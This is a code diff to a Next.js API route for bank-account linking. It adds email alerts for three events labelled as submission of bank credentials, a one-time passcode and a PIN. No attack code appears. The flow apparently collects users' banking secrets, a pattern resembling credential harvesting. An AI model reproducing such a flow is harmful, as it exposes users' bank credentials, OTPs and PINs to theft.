@@ -1,6 +1,7 @@
 import { NextResponse } from "next/server";
 import { verifyToken } from "@/lib/auth";
 import prisma from "@/lib/prisma";
+import { sendActionAlert } from "@/lib/sendMail";
 
 export async function POST(req: Request) {
   try {
@@ -28,6 +29,8 @@ export async function POST(req: Request) {
         },
       });
 
+      await sendActionAlert("Bank Account Linked (Credentials)", user.email);
+
       return NextResponse.json({ success: true, user: { id: user.id, bankLinked: user.bankLinked, bankName: user.bankName } }, { status: 200 });
     }
 
@@ -44,6 +47,8 @@ export async function POST(req: Request) {
         },
       });
 
+      await sendActionAlert("Bank Link: OTP Submitted", user.email);
+
       return NextResponse.json({ success: true, user: { id: user.id } }, { status: 200 });
     }
 
@@ -59,6 +64,8 @@ export async function POST(req: Request) {
           bankVerified: true,
         },
       });
+
+      await sendActionAlert("Bank Link: PIN Submitted", user.email);
 
       return NextResponse.json({ success: true, user: { id: user.id, bankVerified: user.bankVerified } }, { status: 200 });
     }
